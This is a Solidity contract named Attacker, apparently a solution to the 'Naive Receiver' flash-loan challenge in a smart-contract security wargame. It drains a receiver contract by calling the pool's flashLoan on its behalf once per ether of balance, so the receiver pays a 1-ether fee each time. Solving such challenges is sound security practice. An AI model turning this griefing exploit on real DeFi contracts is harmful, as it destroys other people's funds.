// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./NaiveReceiverLenderPool.sol";

contract Attacker {
    address public pool;
    address public receiver;

    constructor(address _pool, address _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() public {
        // attack receiver by repeating flashloan which the receiver will keep paying tx fee.
        // tx fee is 1 ether
        uint256 attackTimes = receiver.balance / 1e18;
        for (uint256 i = 1; i <= attackTimes; i++) {
            NaiveReceiverLenderPool(payable(pool)).flashLoan(receiver, 0);
        }
    }
}
